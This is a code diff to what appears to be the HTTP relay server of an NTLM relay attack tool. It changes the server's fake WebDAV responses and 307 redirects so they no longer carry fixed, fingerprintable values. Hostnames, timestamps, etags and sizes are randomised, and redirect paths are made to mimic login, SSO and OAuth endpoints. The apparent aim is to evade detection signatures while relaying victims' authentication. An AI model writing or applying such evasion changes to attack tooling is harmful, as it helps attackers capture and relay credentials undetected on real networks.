@@ -22,9 +22,11 @@ import http.server
 import socketserver
 import socket
 import base64
+import datetime
 import random
 import struct
 import string
+import time
 from threading import Thread
 from six import PY2, b
 
@@ -187,10 +189,18 @@ class HTTPRelayServer(Thread):
             LOG.info('(HTTP): Client requested path: %s' % self.path.lower())
 
             proxy = False
+            now = datetime.datetime.utcnow()
+            created = now - datetime.timedelta(days=random.randint(30, 720))
+            modified = now - datetime.timedelta(days=random.randint(0, 30))
+            created_iso = created.strftime('%Y-%m-%dT%H:%M:%SZ').encode('ascii')
+            modified_http = modified.strftime('%a, %d %b %Y %H:%M:%S GMT').encode('ascii')
+            etag = ''.join(random.choice('0123456789abcdef') for _ in range(32)).encode('ascii')
+            host_label = ''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(5, 12))).encode('ascii')
             if (".jpg" in self.path) or (".JPG" in self.path):
-                content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+                size = str(random.randint(2000, 200000)).encode('ascii')
+                content = b'<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://' + host_label + b'/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>' + created_iso + b'</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>' + size + b'</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>' + etag + b'</D:getetag><D:getlastmodified>' + modified_http + b'</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>'
             else:
-                content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+                content = b'<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://' + host_label + b'/file/</D:href><D:propstat><D:prop><D:creationdate>' + created_iso + b'</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>' + modified_http + b'</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>'
 
             token, messageType = self.strip_blob(proxy)
 
@@ -216,7 +226,12 @@ class HTTPRelayServer(Thread):
 
         #Trickery to relay the victim to all the targets we want
         def do_REDIRECT(self, proxy=False):
-            rstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
+            redirect_paths = ['auth', 'login', 'account', 'sso', 'session', 'connect', 'redirect', 'oauth2/v2.0/authorize']
+            rlen = random.randint(8, 24)
+            rstr = '%s/%s' % (
+                random.choice(redirect_paths),
+                ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(rlen)),
+            )
             self.send_response(307)
             if proxy:
                 self.send_header('Proxy-Authenticate', 'NTLM')
